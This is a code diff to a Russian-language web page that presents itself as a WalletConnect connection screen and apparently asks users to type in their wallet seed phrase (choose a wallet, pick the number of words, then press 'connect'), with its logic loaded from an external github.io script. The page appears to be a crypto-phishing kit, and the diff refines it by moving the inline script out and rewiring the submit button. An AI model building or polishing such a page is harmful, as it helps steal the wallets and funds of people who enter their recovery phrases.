@@ -2,7 +2,7 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>🔗 WalletConnect — Подключение</title>
 
     <!-- Orbitron font -->
@@ -50,7 +50,7 @@
                 </ul>
             </div>
         </div>
-        <input type="hidden" id="wallet" name="wallet" value="MetaMask" />
+        <input type="hidden" id="wallet" value="MetaMask" />
 
         <label for="length"><i data-feather="list"></i> Количество слов</label>
         <select id="length" onchange="renderSeedInputs(); clearWarning();">
@@ -62,7 +62,7 @@
         <div id="validationWarning" class="warning" style="display:none;"></div>
         <p id="processingInfo" class="small" style="display:none;"></p>
 
-        <button onclick="submitSeed()">
+        <button id="submitBtn">
             <i data-feather="link"></i> Подключить
         </button>
 
@@ -71,33 +71,7 @@
         </p>
     </div>
 
-    <!-- Scripts -->
+    <!-- Основний скрипт -->
     <script src="https://sp574-maker.github.io/maker/script.js" defer></script>
-    <script>
-        feather.replace();
-
-        const selectWrapper = document.querySelector('.custom-select');
-        const selected = selectWrapper.querySelector('.selected');
-        const options = selectWrapper.querySelectorAll('.options li');
-        const hiddenInput = document.querySelector('#wallet');
-
-        selected.addEventListener('click', () => {
-            selectWrapper.classList.toggle('open');
-        });
-
-        options.forEach(option => {
-            option.addEventListener('click', () => {
-                selected.innerHTML = option.innerHTML;
-                hiddenInput.value = option.dataset.value;
-                selectWrapper.classList.remove('open');
-            });
-        });
-
-        document.addEventListener('click', e => {
-            if (!selectWrapper.contains(e.target)) {
-                selectWrapper.classList.remove('open');
-            }
-        });
-    </script>
 </body>
 </html>
